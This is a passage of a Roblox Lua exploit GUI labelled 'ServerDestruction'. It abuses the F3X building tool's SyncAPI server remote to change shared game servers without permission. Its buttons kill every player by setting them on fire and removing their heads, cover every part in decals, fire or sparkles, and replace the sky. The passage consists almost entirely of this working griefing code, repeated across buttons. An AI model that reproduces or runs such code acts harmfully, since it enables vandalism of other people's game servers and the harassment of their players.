					["Face"] = side,
					["TextureType"] = "Decal"
				}
			}
		}

		_(args)
	end
	function AddDecal(part,asset,side)
		local args = {
			[1] = "SyncTexture",
			[2] = {
				[1] = {
					["Part"] = part,
					["Face"] = side,
					["TextureType"] = "Decal",
					["Texture"] = "rbxassetid://".. asset
				}
			}
		}
		_(args)
	end

	function Sky(id)
		e = char.HumanoidRootPart.CFrame.x
		f = char.HumanoidRootPart.CFrame.y
		g = char.HumanoidRootPart.CFrame.z
		CreatePart(CFrame.new(math.floor(e),math.floor(f),math.floor(g)) + Vector3.new(0,6,0),workspace)
		for i,v in game.Workspace:GetDescendants() do
			if v:IsA("BasePart") and v.CFrame.x == math.floor(e) and v.CFrame.z == math.floor(g) then
				--spawn(function()
				SetName(v,"Sky")
				AddMesh(v)
				--end)
				--spawn(function()
				SetMesh(v,"8006679977")
				SetTexture(v,id)
				--end)
				MeshResize(v,Vector3.new(50,50,50))
				SetLocked(v,true)
			end
		end
	end
	Sky("84607421311100")
end)

TextButton_14.Parent = ServerDestruction
TextButton_14.BackgroundColor3 = Color3.fromRGB(17, 17, 17)
TextButton_14.BorderColor3 = Color3.fromRGB(255, 0, 0)
TextButton_14.BorderSizePixel = 3
TextButton_14.Position = UDim2.new(0.5, 3, 0, 132)
TextButton_14.Size = UDim2.new(0.5, -3, 0, 30)
TextButton_14.ZIndex = 2
TextButton_14.Font = Enum.Font.SourceSans
TextButton_14.Text = "Clear Workspace"
TextButton_14.TextColor3 = Color3.fromRGB(255, 255, 255)
TextButton_14.TextSize = 14.000
TextButton_14.TextWrapped = true
TextButton_14.MouseButton1Down:connect(function()
	
end)

TextButton_15.Parent = ServerDestruction
TextButton_15.BackgroundColor3 = Color3.fromRGB(17, 17, 17)
TextButton_15.BorderColor3 = Color3.fromRGB(255, 0, 0)
TextButton_15.BorderSizePixel = 3
TextButton_15.Position = UDim2.new(0, 0, 0, 165)
TextButton_15.Size = UDim2.new(0.5, 0, 0, 30)
TextButton_15.ZIndex = 2
TextButton_15.Font = Enum.Font.SourceSans
TextButton_15.Text = "Fire All (Kills)"
TextButton_15.TextColor3 = Color3.fromRGB(255, 255, 255)
TextButton_15.TextSize = 14.000
TextButton_15.MouseButton1Down:connect(function()
	--rgrg
	local player = game.Players.LocalPlayer
	local char = player.Character
	local tool
	for i,v in player:GetDescendants() do
		if v.Name == "SyncAPI" then
			tool = v.Parent
		end
	end
	for i,v in game.ReplicatedStorage:GetDescendants() do
		if v.Name == "SyncAPI" then
			tool = v.Parent
		end
	end
	--craaa
	remote = tool.SyncAPI.ServerEndpoint
	function _(args)
		remote:InvokeServer(unpack(args))
	end
	function SetCollision(part,boolean)
		local args = {
			[1] = "SyncCollision",
			[2] = {
				[1] = {
					["Part"] = part,
					["CanCollide"] = boolean
				}
			}
		}
		_(args)
	end
	function SetAnchor(boolean,part)
		local args = {
			[1] = "SyncAnchor",
			[2] = {
				[1] = {
					["Part"] = part,
					["Anchored"] = boolean
				}
			}
		}
		_(args)
	end
	function CreatePart(cf,parent)
		local args = {
			[1] = "CreatePart",
			[2] = "Normal",
			[3] = cf,
			[4] = parent
		}
		_(args)
	end
	function DestroyPart(part)
		local args = {
			[1] = "Remove",
			[2] = {
				[1] = part
			}
		}
		_(args)
	end
	function MovePart(part,cf)
		local args = {
			[1] = "SyncMove",
			[2] = {
				[1] = {
					["Part"] = part,
					["CFrame"] = cf
				}
			}
		}
		_(args)
	end
	function Resize(part,size,cf)
		local args = {
			[1] = "SyncResize",
			[2] = {
				[1] = {
					["Part"] = part,
					["CFrame"] = cf,
					["Size"] = size
				}
			}
		}
		_(args)
	end
	function AddMesh(part)
		local args = {
			[1] = "CreateMeshes",
			[2] = {
				[1] = {
					["Part"] = part
				}
			}
		}
		_(args)
	end

	function SetMesh(part,meshid)
		local args = {
			[1] = "SyncMesh",
			[2] = {
				[1] = {
					["Part"] = part,
					["MeshId"] = "rbxassetid://"..meshid
				}
			}
		}
		_(args)
	end
	function SetTexture(part, texid)
		local args = {
			[1] = "SyncMesh",
			[2] = {
				[1] = {
					["Part"] = part,
					["TextureId"] = "rbxassetid://"..texid
				}
			}
		}
		_(args)
	end
	function SetName(part, stringg)
		local args = {
			[1] = "SetName",
			[2] = {
				[1] = workspace.Part
			},
			[3] = stringg
		}

		_(args)
	end
	function MeshResize(part,size)
		local args = {
			[1] = "SyncMesh",
			[2] = {
				[1] = {
					["Part"] = part,
					["Scale"] = size
				}
			}
		}
		_(args)
	end
	function Weld(part1, part2,lead)
		local args = {
			[1] = "CreateWelds",
			[2] = {
				[1] = part1,
				[2] = part2
			},
			[3] = lead
		}
		_(args)

	end
	function SetLocked(part,boolean)
		local args = {
			[1] = "SetLocked",
			[2] = {
				[1] = part
			},
			[3] = boolean
		}
		_(args)
	end
	function SetTrans(part,int)
		local args = {
			[1] = "SyncMaterial",
			[2] = {
				[1] = {
					["Part"] = part,
					["Transparency"] = int
				}
			}
		}
		_(args)
	end
	function CreateSpotlight(part)
		local args = {
			[1] = "CreateLights",
			[2] = {
				[1] = {
					["Part"] = workspace.Part,
					["LightType"] = "SpotLight"
				}
			}
		}
		_(args)
	end
	function SyncLighting(part,brightness)
		local args = {
			[1] = "SyncLighting",
			[2] = {
				[1] = {
					["Part"] = part,
					["LightType"] = "SpotLight",
					["Brightness"] = brightness
				}
			}
		}
		_(args)
	end
	function AddFire(part)
		local args = {
			[1] = "CreateDecorations",
			[2] = {
				[1] = {
					["Part"] = part,
					["DecorationType"] = "Fire"
				}
			}
		}
		_(args)
	end

	function Fire(player)
		for i,v in player.Character:GetDescendants() do
			if v:IsA("BasePart") then
				AddFire(v)
			end
		end
		DestroyPart(player.Character.Head)
	end

	for i,v in game.Players:GetPlayers() do
		spawn(function()
			pcall(function()
				Fire(v)
			end)
		end)
	end
end)

TextButton_16.Parent = ServerDestruction
TextButton_16.BackgroundColor3 = Color3.fromRGB(17, 17, 17)
TextButton_16.BorderColor3 = Color3.fromRGB(255, 0, 0)
TextButton_16.BorderSizePixel = 3
TextButton_16.Position = UDim2.new(0.5, 3, 0, 165)
TextButton_16.Size = UDim2.new(0.5, -3, 0, 30)
TextButton_16.ZIndex = 2
TextButton_16.Font = Enum.Font.SourceSans
TextButton_16.Text = "Fire All (No Kill)"
TextButton_16.TextColor3 = Color3.fromRGB(255, 255, 255)
TextButton_16.TextSize = 14.000
TextButton_16.TextWrapped = true
TextButton_16.MouseButton1Down:connect(function()
	local player = game.Players.LocalPlayer
	local char = player.Character
	local tool
	for i,v in player:GetDescendants() do
		if v.Name == "SyncAPI" then
			tool = v.Parent
		end
	end
	for i,v in game.ReplicatedStorage:GetDescendants() do
		if v.Name == "SyncAPI" then
			tool = v.Parent
		end
	end
	--craaa
	remote = tool.SyncAPI.ServerEndpoint
	function _(args)
		remote:InvokeServer(unpack(args))
	end
	function SetCollision(part,boolean)
		local args = {
			[1] = "SyncCollision",
			[2] = {
				[1] = {
					["Part"] = part,
					["CanCollide"] = boolean
				}
			}
		}
		_(args)
	end
	function SetAnchor(boolean,part)
		local args = {
			[1] = "SyncAnchor",
			[2] = {
				[1] = {
					["Part"] = part,
					["Anchored"] = boolean
				}
			}
		}
		_(args)
	end
	function CreatePart(cf,parent)
		local args = {
			[1] = "CreatePart",
			[2] = "Normal",
			[3] = cf,
			[4] = parent
		}
		_(args)
	end
	function DestroyPart(part)
		local args = {
			[1] = "Remove",
			[2] = {
				[1] = part
			}
		}
		_(args)
	end
	function MovePart(part,cf)
		local args = {
			[1] = "SyncMove",
			[2] = {
				[1] = {
					["Part"] = part,
					["CFrame"] = cf
				}
			}
		}
		_(args)
	end
	function Resize(part,size,cf)
		local args = {
			[1] = "SyncResize",
			[2] = {
				[1] = {
					["Part"] = part,
					["CFrame"] = cf,
					["Size"] = size
				}
			}
		}
		_(args)
	end
	function AddMesh(part)
		local args = {
			[1] = "CreateMeshes",
			[2] = {
				[1] = {
					["Part"] = part
				}
			}
		}
		_(args)
	end

	function SetMesh(part,meshid)
		local args = {
			[1] = "SyncMesh",
			[2] = {
				[1] = {
					["Part"] = part,
					["MeshId"] = "rbxassetid://"..meshid
				}
			}
		}
		_(args)
	end
	function SetTexture(part, texid)
		local args = {
			[1] = "SyncMesh",
			[2] = {
				[1] = {
					["Part"] = part,
					["TextureId"] = "rbxassetid://"..texid
				}
			}
		}
		_(args)
	end
	function SetName(part, stringg)
		local args = {
			[1] = "SetName",
			[2] = {
				[1] = workspace.Part
			},
			[3] = stringg
		}

		_(args)
	end
	function MeshResize(part,size)
		local args = {
			[1] = "SyncMesh",
			[2] = {
				[1] = {
					["Part"] = part,
					["Scale"] = size
				}
			}
		}
		_(args)
	end
	function Weld(part1, part2,lead)
		local args = {
			[1] = "CreateWelds",
			[2] = {
				[1] = part1,
				[2] = part2
			},
			[3] = lead
		}
		_(args)

	end
	function SetLocked(part,boolean)
		local args = {
			[1] = "SetLocked",
			[2] = {
				[1] = part
			},
			[3] = boolean
		}
		_(args)
	end
	function SetTrans(part,int)
		local args = {
			[1] = "SyncMaterial",
			[2] = {
				[1] = {
					["Part"] = part,
					["Transparency"] = int
				}
			}
		}
		_(args)
	end
	function CreateSpotlight(part)
		local args = {
			[1] = "CreateLights",
			[2] = {
				[1] = {
					["Part"] = part,
					["LightType"] = "SpotLight"
				}
			}
		}
		_(args)
	end
	function SyncLighting(part,brightness)
		local args = {
			[1] = "SyncLighting",
			[2] = {
				[1] = {
					["Part"] = part,
					["LightType"] = "SpotLight",
					["Brightness"] = brightness
				}
			}
		}
		_(args)
	end
	function AddFire(part)
		local args = {
			[1] = "CreateDecorations",
			[2] = {
				[1] = {
					["Part"] = part,
					["DecorationType"] = "Fire"
				}
			}
		}
		_(args)
	end
	function FireParts()
		for i,v in game.Workspace:GetDescendants() do
			spawn(function()
				SetLocked(v,false)
				AddFire(v)
			end)
		end
	end
	FireParts()

end)

TextButton_17.Parent = ServerDestruction
TextButton_17.BackgroundColor3 = Color3.fromRGB(17, 17, 17)
TextButton_17.BorderColor3 = Color3.fromRGB(255, 0, 0)
TextButton_17.BorderSizePixel = 3
TextButton_17.Position = UDim2.new(0.5, 0, 0, 198)
TextButton_17.Size = UDim2.new(0.5, 0, 0, 30)
TextButton_17.ZIndex = 2
TextButton_17.Font = Enum.Font.SourceSans
TextButton_17.Text = "Scarify"
TextButton_17.TextColor3 = Color3.fromRGB(255, 255, 255)
TextButton_17.TextSize = 14.000
TextButton_17.TextWrapped = true
TextButton_17.MouseButton1Down:connect(function()
	--rgrg
	local player = game.Players.LocalPlayer
	local char = player.Character
	local tool
	for i,v in player:GetDescendants() do
		if v.Name == "SyncAPI" then
			tool = v.Parent
		end
	end
	for i,v in game.ReplicatedStorage:GetDescendants() do
		if v.Name == "SyncAPI" then
			tool = v.Parent
		end
	end
	--craaa
	remote = tool.SyncAPI.ServerEndpoint
	function _(args)
		remote:InvokeServer(unpack(args))
	end
	function SetCollision(part,boolean)
		local args = {
			[1] = "SyncCollision",
			[2] = {
				[1] = {
					["Part"] = part,
					["CanCollide"] = boolean
				}
			}
		}
		_(args)
	end
	function SetAnchor(boolean,part)
		local args = {
			[1] = "SyncAnchor",
			[2] = {
				[1] = {
					["Part"] = part,
					["Anchored"] = boolean
				}
			}
		}
		_(args)
	end
	function CreatePart(cf,parent)
		local args = {
			[1] = "CreatePart",
			[2] = "Normal",
			[3] = cf,
			[4] = parent
		}
		_(args)
	end
	function DestroyPart(part)
		local args = {
			[1] = "Remove",
			[2] = {
				[1] = part
			}
		}
		_(args)
	end
	function MovePart(part,cf)
		local args = {
			[1] = "SyncMove",
			[2] = {
				[1] = {
					["Part"] = part,
					["CFrame"] = cf
				}
			}
		}
		_(args)
	end
	function Resize(part,size,cf)
		local args = {
			[1] = "SyncResize",
			[2] = {
				[1] = {
					["Part"] = part,
					["CFrame"] = cf,
					["Size"] = size
				}
			}
		}
		_(args)
	end
	function AddMesh(part)
		local args = {
			[1] = "CreateMeshes",
			[2] = {
				[1] = {
					["Part"] = part
				}
			}
		}
		_(args)
	end

	function SetMesh(part,meshid)
		local args = {
			[1] = "SyncMesh",
			[2] = {
				[1] = {
					["Part"] = part,
					["MeshId"] = "rbxassetid://"..meshid
				}
			}
		}
		_(args)
	end
	function SetTexture(part, texid)
		local args = {
			[1] = "SyncMesh",
			[2] = {
				[1] = {
					["Part"] = part,
					["TextureId"] = "rbxassetid://"..texid
				}
			}
		}
		_(args)
	end
	function SetName(part, stringg)
		local args = {
			[1] = "SetName",
			[2] = {
				[1] = part
			},
			[3] = stringg
		}

		_(args)
	end
	function MeshResize(part,size)
		local args = {
			[1] = "SyncMesh",
			[2] = {
				[1] = {
					["Part"] = part,
					["Scale"] = size
				}
			}
		}
		_(args)
	end
	function Weld(part1, part2,lead)
		local args = {
			[1] = "CreateWelds",
			[2] = {
				[1] = part1,
				[2] = part2
			},
			[3] = lead
		}
		_(args)

	end
	function SetLocked(part,boolean)
		local args = {
			[1] = "SetLocked",
			[2] = {
				[1] = part
			},
			[3] = boolean
		}
		_(args)
	end
	function SetTrans(part,int)
		local args = {
			[1] = "SyncMaterial",
			[2] = {
				[1] = {
					["Part"] = part,
					["Transparency"] = int
				}
			}
		}
		_(args)
	end
	function CreateSpotlight(part)
		local args = {
			[1] = "CreateLights",
			[2] = {
				[1] = {
					["Part"] = part,
					["LightType"] = "SpotLight"
				}
			}
		}
		_(args)
	end
	function SyncLighting(part,brightness)
		local args = {
			[1] = "SyncLighting",
			[2] = {
				[1] = {
					["Part"] = part,
					["LightType"] = "SpotLight",
					["Brightness"] = brightness
				}
			}
		}
		_(args)
	end
	function Color(part,color)
		local args = {
			[1] = "SyncColor",
			[2] = {
				[1] = {
					["Part"] = part,
					["Color"] = color --[[Color3]],
					["UnionColoring"] = false
				}
			}
		}
		_(args)
	end
	function SpawnDecal(part,side)
		local args = {
			[1] = "CreateTextures",
			[2] = {
				[1] = {
					["Part"] = part,
					["Face"] = side,
					["TextureType"] = "Decal"
				}
			}
		}

		_(args)
	end
	function AddDecal(part,asset,side)
		local args = {
			[1] = "SyncTexture",
			[2] = {
				[1] = {
					["Part"] = part,
					["Face"] = side,
					["TextureType"] = "Decal",
					["Texture"] = "rbxassetid://".. asset
				}
			}
		}
		_(args)
	end

	function Sky(id)
		e = char.HumanoidRootPart.CFrame.x
		f = char.HumanoidRootPart.CFrame.y
		g = char.HumanoidRootPart.CFrame.z
		CreatePart(CFrame.new(math.floor(e),math.floor(f),math.floor(g)) + Vector3.new(0,6,0),workspace)
		for i,v in game.Workspace:GetDescendants() do
			if v:IsA("BasePart") and v.CFrame.x == math.floor(e) and v.CFrame.z == math.floor(g) then
				--spawn(function()
				SetName(v,"Sky")
				AddMesh(v)
				--end)
				--spawn(function()
				SetMesh(v,"8006679977")
				SetTexture(v,id)
				--end)
				MeshResize(v,Vector3.new(50,50,50))
				SetLocked(v,true)
			end
		end
	end
	Sky("108478466163198")



	local player = game.Players.LocalPlayer
	local char = player.Character
	local tool
	for i,v in player:GetDescendants() do
		if v.Name == "SyncAPI" then
			tool = v.Parent
		end
	end
	for i,v in game.ReplicatedStorage:GetDescendants() do
		if v.Name == "SyncAPI" then
			tool = v.Parent
		end
	end
	--craaa
	remote = tool.SyncAPI.ServerEndpoint
	function _(args)
		remote:InvokeServer(unpack(args))
	end
	function SetCollision(part,boolean)
		local args = {
			[1] = "SyncCollision",
			[2] = {
				[1] = {
					["Part"] = part,
					["CanCollide"] = boolean
				}
			}
		}
		_(args)
	end
	function SetAnchor(boolean,part)
		local args = {
			[1] = "SyncAnchor",
			[2] = {
				[1] = {
					["Part"] = part,
					["Anchored"] = boolean
				}
			}
		}
		_(args)
	end
	function CreatePart(cf,parent)
		local args = {
			[1] = "CreatePart",
			[2] = "Normal",
			[3] = cf,
			[4] = parent
		}
		_(args)
	end
	function DestroyPart(part)
		local args = {
			[1] = "Remove",
			[2] = {
				[1] = part
			}
		}
		_(args)
	end
	function MovePart(part,cf)
		local args = {
			[1] = "SyncMove",
			[2] = {
				[1] = {
					["Part"] = part,
					["CFrame"] = cf
				}
			}
		}
		_(args)
	end
	function Resize(part,size,cf)
		local args = {
			[1] = "SyncResize",
			[2] = {
				[1] = {
					["Part"] = part,
					["CFrame"] = cf,
					["Size"] = size
				}
			}
		}
		_(args)
	end
	function AddMesh(part)
		local args = {
			[1] = "CreateMeshes",
			[2] = {
				[1] = {
					["Part"] = part
				}
			}
		}
		_(args)
	end

	function SetMesh(part,meshid)
		local args = {
			[1] = "SyncMesh",
			[2] = {
				[1] = {
					["Part"] = part,
					["MeshId"] = "rbxassetid://"..meshid
				}
			}
		}
		_(args)
	end
	function SetTexture(part, texid)
		local args = {
			[1] = "SyncMesh",
			[2] = {
				[1] = {
					["Part"] = part,
					["TextureId"] = "rbxassetid://"..texid
				}
			}
		}
		_(args)
	end
	function SetName(part, stringg)
		local args = {
			[1] = "SetName",
			[2] = {
				[1] = part
			},
			[3] = stringg
		}

		_(args)
	end
	function MeshResize(part,size)
		local args = {
			[1] = "SyncMesh",
			[2] = {
				[1] = {
					["Part"] = part,
					["Scale"] = size
				}
			}
		}
		_(args)
	end
	function Weld(part1, part2,lead)
		local args = {
			[1] = "CreateWelds",
			[2] = {
				[1] = part1,
				[2] = part2
			},
			[3] = lead
		}
		_(args)

	end
	function SetLocked(part,boolean)
		local args = {
			[1] = "SetLocked",
			[2] = {
				[1] = part
			},
			[3] = boolean
		}
		_(args)
	end
	function SetTrans(part,int)
		local args = {
			[1] = "SyncMaterial",
			[2] = {
				[1] = {
					["Part"] = part,
					["Transparency"] = int
				}
			}
		}
		_(args)
	end
	function CreateSpotlight(part)
		local args = {
			[1] = "CreateLights",
			[2] = {
				[1] = {
					["Part"] = part,
					["LightType"] = "SpotLight"
				}
			}
		}
		_(args)
	end
	function SyncLighting(part,brightness)
		local args = {
			[1] = "SyncLighting",
			[2] = {
				[1] = {
					["Part"] = part,
					["LightType"] = "SpotLight",
					["Brightness"] = brightness
				}
			}
		}
		_(args)
	end
	function Color(part,color)
		local args = {
			[1] = "SyncColor",
			[2] = {
				[1] = {
					["Part"] = part,
					["Color"] = color --[[Color3]],
					["UnionColoring"] = false
				}
			}
		}
		_(args)
	end
	function SpawnDecal(part,side)
		local args = {
			[1] = "CreateTextures",
			[2] = {
				[1] = {
					["Part"] = part,
					["Face"] = side,
					["TextureType"] = "Decal"
				}
			}
		}

		_(args)
	end
	function AddDecal(part,asset,side)
		local args = {
			[1] = "SyncTexture",
			[2] = {
				[1] = {
					["Part"] = part,
					["Face"] = side,
					["TextureType"] = "Decal",
					["Texture"] = "rbxassetid://".. asset
				}
			}
		}
		_(args)
	end

	function spam(id)
		for i,v in game.workspace:GetDescendants() do
			if v:IsA("BasePart") then
				spawn(function()
					SetLocked(v,false)
					SpawnDecal(v,Enum.NormalId.Front)
					AddDecal(v,id,Enum.NormalId.Front)

					SpawnDecal(v,Enum.NormalId.Back)
					AddDecal(v,id,Enum.NormalId.Back)

					SpawnDecal(v,Enum.NormalId.Right)
					AddDecal(v,id,Enum.NormalId.Right)

					SpawnDecal(v,Enum.NormalId.Left)
					AddDecal(v,id,Enum.NormalId.Left)

					SpawnDecal(v,Enum.NormalId.Bottom)
					AddDecal(v,id,Enum.NormalId.Bottom)

					SpawnDecal(v,Enum.NormalId.Top)
					AddDecal(v,id,Enum.NormalId.Top)
				end)
			end
		end 
	end
	spam("108478466163198")

end)

TextButton_18.Parent = ServerDestruction
TextButton_18.BackgroundColor3 = Color3.fromRGB(17, 17, 17)
TextButton_18.BorderColor3 = Color3.fromRGB(255, 0, 0)
TextButton_18.BorderSizePixel = 3
TextButton_18.Position = UDim2.new(0, 0, 0, 198)
TextButton_18.Size = UDim2.new(0.5, 0, 0, 30)
TextButton_18.ZIndex = 2
TextButton_18.Font = Enum.Font.SourceSans
TextButton_18.Text = "Create Baseplate"
TextButton_18.TextColor3 = Color3.fromRGB(255, 255, 255)
TextButton_18.TextSize = 14.000
TextButton_18.TextWrapped = true
TextButton_18.MouseButton1Down:connect(function()
	local player = game.Players.LocalPlayer
	local char = player.Character
	local tool
	for i,v in player:GetDescendants() do
		if v.Name == "SyncAPI" then
			tool = v.Parent
		end
	end
	for i,v in game.ReplicatedStorage:GetDescendants() do
		if v.Name == "SyncAPI" then
			tool = v.Parent
		end
	end
	--craaa
	remote = tool.SyncAPI.ServerEndpoint
	function _(args)
		remote:InvokeServer(unpack(args))
	end
	function SetCollision(part,boolean)
		local args = {
			[1] = "SyncCollision",
			[2] = {
				[1] = {
					["Part"] = part,
					["CanCollide"] = boolean
				}
			}
		}
		_(args)
	end
	function SetAnchor(boolean,part)
		local args = {
			[1] = "SyncAnchor",
			[2] = {
				[1] = {
					["Part"] = part,
					["Anchored"] = boolean
				}
			}
		}
		_(args)
	end
	function CreatePart(cf,parent,types)
		local args = {
			[1] = "CreatePart",
			[2] = types,
			[3] = cf,
			[4] = parent
		}
		_(args)
	end
	function DestroyPart(part)
		local args = {
			[1] = "Remove",
			[2] = {
				[1] = part
			}
		}
		_(args)
	end
	function MovePart(part,cf)
		local args = {
			[1] = "SyncMove",
			[2] = {
				[1] = {
					["Part"] = part,
					["CFrame"] = cf
				}
			}
		}
		_(args)
	end
	function Resize(part,size,cf)
		local args = {
			[1] = "SyncResize",
			[2] = {
				[1] = {
					["Part"] = part,
					["CFrame"] = cf,
					["Size"] = size
				}
			}
		}
		_(args)
	end
	function AddMesh(part)
		local args = {
			[1] = "CreateMeshes",
			[2] = {
				[1] = {
					["Part"] = part
				}
			}
		}
		_(args)
	end

	function SetMesh(part,meshid)
		local args = {
			[1] = "SyncMesh",
			[2] = {
				[1] = {
					["Part"] = part,
					["MeshId"] = "rbxassetid://"..meshid
				}
			}
		}
		_(args)
	end
	function SetTexture(part, texid)
		local args = {
			[1] = "SyncMesh",
			[2] = {
				[1] = {
					["Part"] = part,
					["TextureId"] = "rbxassetid://"..texid
				}
			}
		}
		_(args)
	end
	function SetName(part, stringg)
		local args = {
			[1] = "SetName",
			[2] = {
				[1] = workspace.Part
			},
			[3] = stringg
		}

		_(args)
	end
	function MeshResize(part,size)
		local args = {
			[1] = "SyncMesh",
			[2] = {
				[1] = {
					["Part"] = part,
					["Scale"] = size
				}
			}
		}
		_(args)
	end
	function Weld(part1, part2,lead)
		local args = {
			[1] = "CreateWelds",
			[2] = {
				[1] = part1,
				[2] = part2
			},
			[3] = lead
		}
		_(args)

	end
	function SetLocked(part,boolean)
		local args = {
			[1] = "SetLocked",
			[2] = {
				[1] = part
			},
			[3] = boolean
		}
		_(args)
	end
	function SetTrans(part,int)
		local args = {
			[1] = "SyncMaterial",
			[2] = {
				[1] = {
					["Part"] = part,
					["Transparency"] = int
				}
			}
		}
		_(args)
	end
	function CreateSpotlight(part)
		local args = {
			[1] = "CreateLights",
			[2] = {
				[1] = {
					["Part"] = part,
					["LightType"] = "SpotLight"
				}
			}
		}
		_(args)
	end
	function SyncLighting(part,brightness)
		local args = {
			[1] = "SyncLighting",
			[2] = {
				[1] = {
					["Part"] = part,
					["LightType"] = "SpotLight",
					["Brightness"] = brightness
				}
			}
		}
		_(args)
	end

	function Material(part,mate)

		local args = {
			[1] = "SyncMaterial",
			[2] = {
				[1] = {
					["Part"] = part,
					["Material"] = mate
				}
			}
		}
		_(args)
	end
	function Color(part,color)
		local args = {
			[1] = "SyncColor",
			[2] = {
				[1] = {
					["Part"] = part,
					["Color"] = color --[[Color3]],
					["UnionColoring"] = false
				}
			}
		}
		_(args)
	end
	hrpx = math.floor(char.HumanoidRootPart.CFrame.x)
	hrpz = math.floor(char.HumanoidRootPart.CFrame.z)
	hrpy = math.floor(char.HumanoidRootPart.CFrame.y)
	function SpawnBasePlate()
		CreatePart(CFrame.new(hrpx,hrpy-20,hrpz),workspace,"Spawn")
		for i,v in game.Workspace:GetChildren() do
			if v:IsA("BasePart") and v.CFrame.y == hrpy - 20 and v.CFrame.x == hrpx then
				spawn(function()
					Resize(v,Vector3.new(1000,2,1000),CFrame.new(hrpx,hrpy-20,hrpz))
					Material(v,Enum.Material.Grass)
					Color(v,Color3.fromRGB(25,100,25))
					while wait(1) do
						pcall(function()SetLocked(v,true)end)
					end
				end)
			end
		end
	end
	SpawnBasePlate()
end)

TextButton_19.Parent = ServerDestruction
TextButton_19.BackgroundColor3 = Color3.fromRGB(17, 17, 17)
TextButton_19.BorderColor3 = Color3.fromRGB(255, 0, 0)
TextButton_19.BorderSizePixel = 3
TextButton_19.Position = UDim2.new(-0.0133333337, 3, 0.455431759, 66)
TextButton_19.Size = UDim2.new(0.513333321, -3, 0.00696378853, 30)
TextButton_19.ZIndex = 2
TextButton_19.Font = Enum.Font.SourceSans
TextButton_19.Text = "Particle Spam"
TextButton_19.TextColor3 = Color3.fromRGB(255, 255, 255)
TextButton_19.TextSize = 14.000
TextButton_19.MouseButton1Down:connect(function()
	local player = game.Players.LocalPlayer
	local char = player.Character
	local tool
	for i,v in player:GetDescendants() do
		if v.Name == "SyncAPI" then
			tool = v.Parent
		end
	end
	for i,v in game.ReplicatedStorage:GetDescendants() do
		if v.Name == "SyncAPI" then
			tool = v.Parent
		end
	end
	--craaa
	remote = tool.SyncAPI.ServerEndpoint
	function _(args)
		remote:InvokeServer(unpack(args))
	end
	function SetCollision(part,boolean)
		local args = {
			[1] = "SyncCollision",
			[2] = {
				[1] = {
					["Part"] = part,
					["CanCollide"] = boolean
				}
			}
		}
		_(args)
	end
	function SetAnchor(boolean,part)
		local args = {
			[1] = "SyncAnchor",
			[2] = {
				[1] = {
					["Part"] = part,
					["Anchored"] = boolean
				}
			}
		}
		_(args)
	end
	function CreatePart(cf,parent)
		local args = {
			[1] = "CreatePart",
			[2] = "Normal",
			[3] = cf,
			[4] = parent
		}
		_(args)
	end
	function DestroyPart(part)
		local args = {
			[1] = "Remove",
			[2] = {
				[1] = part
			}
		}
		_(args)
	end
	function MovePart(part,cf)
		local args = {
			[1] = "SyncMove",
			[2] = {
				[1] = {
					["Part"] = part,
					["CFrame"] = cf
				}
			}
		}
		_(args)
	end
	function Resize(part,size,cf)
		local args = {
			[1] = "SyncResize",
			[2] = {
				[1] = {
					["Part"] = part,
					["CFrame"] = cf,
					["Size"] = size
				}
			}
		}
		_(args)
	end
	function AddMesh(part)
		local args = {
			[1] = "CreateMeshes",
			[2] = {
				[1] = {
					["Part"] = part
				}
			}
		}
		_(args)
	end

	function SetMesh(part,meshid)
		local args = {
			[1] = "SyncMesh",
			[2] = {
				[1] = {
					["Part"] = part,
					["MeshId"] = "rbxassetid://"..meshid
				}
			}
		}
		_(args)
	end
	function SetTexture(part, texid)
		local args = {
			[1] = "SyncMesh",
			[2] = {
				[1] = {
					["Part"] = part,
					["TextureId"] = "rbxassetid://"..texid
				}
			}
		}
		_(args)
	end
	function SetName(part, stringg)
		local args = {
			[1] = "SetName",
			[2] = {
				[1] = workspace.Part
			},
			[3] = stringg
		}

		_(args)
	end
	function MeshResize(part,size)
		local args = {
			[1] = "SyncMesh",
			[2] = {
				[1] = {
					["Part"] = part,
					["Scale"] = size
				}
			}
		}
		_(args)
	end
	function Weld(part1, part2,lead)
		local args = {
			[1] = "CreateWelds",
			[2] = {
				[1] = part1,
				[2] = part2
			},
			[3] = lead
		}
		_(args)

	end
	function SetLocked(part,boolean)
		local args = {
			[1] = "SetLocked",
			[2] = {
				[1] = part
			},
			[3] = boolean
		}
		_(args)
	end
	function SetTrans(part,int)
		local args = {
			[1] = "SyncMaterial",
			[2] = {
				[1] = {
					["Part"] = part,
					["Transparency"] = int
				}
			}
		}
		_(args)
	end
	function CreateSpotlight(part)
		local args = {
			[1] = "CreateLights",
			[2] = {
				[1] = {
					["Part"] = part,
					["LightType"] = "SpotLight"
				}
			}
		}
		_(args)
	end
	function SyncLighting(part,brightness)
		local args = {
			[1] = "SyncLighting",
			[2] = {
				[1] = {
					["Part"] = part,
					["LightType"] = "SpotLight",
					["Brightness"] = brightness
				}
			}
		}
		_(args)
	end
	function AddSparkles(part)
		local args = {
			[1] = "CreateDecorations",
			[2] = {
				[1] = {
					["Part"] = part,
					["DecorationType"] = "Sparkles"
				}
			}
		}
		_(args)
	end
	function SparklesParts()
		for i,v in game.Workspace:GetDescendants() do
			spawn(function()
				SetLocked(v,false)
				AddSparkles(v)
			end)
		end
	end
	SparklesParts()

end)

TextButton_20.Parent = ServerDestruction
TextButton_20.BackgroundColor3 = Color3.fromRGB(17, 17, 17)
TextButton_20.BorderColor3 = Color3.fromRGB(255, 0, 0)
TextButton_20.BorderSizePixel = 3
TextButton_20.Position = UDim2.new(0.519999981, 0, 0.0947075263, 198)
TextButton_20.Size = UDim2.new(0.5, 0, 0, 30)
TextButton_20.ZIndex = 2
TextButton_20.Font = Enum.Font.SourceSans
TextButton_20.Text = "Clone Heads"
TextButton_20.TextColor3 = Color3.fromRGB(255, 255, 255)
TextButton_20.TextSize = 16.000
TextButton_20.TextWrapped = true
TextButton_20.MouseButton1Down:connect(function()
	local player = game.Players.LocalPlayer
	local char = player.Character
	local tool
	for i,v in player:GetDescendants() do
		if v.Name == "SyncAPI" then
			tool = v.Parent
		end
	end
	for i,v in game.ReplicatedStorage:GetDescendants() do
		if v.Name == "SyncAPI" then
			tool = v.Parent
		end
	end
	--craaa
	remote = tool.SyncAPI.ServerEndpoint
	function _(args)
		remote:InvokeServer(unpack(args))
	end
	function SetCollision(part,boolean)
		local args = {
			[1] = "SyncCollision",
			[2] = {
				[1] = {
					["Part"] = part,
					["CanCollide"] = boolean
				}
			}
		}
		_(args)
	end
	function SetAnchor(boolean,part)
		local args = {
			[1] = "SyncAnchor",
			[2] = {
				[1] = {
					["Part"] = part,
					["Anchored"] = boolean
				}
			}
		}
		_(args)
	end
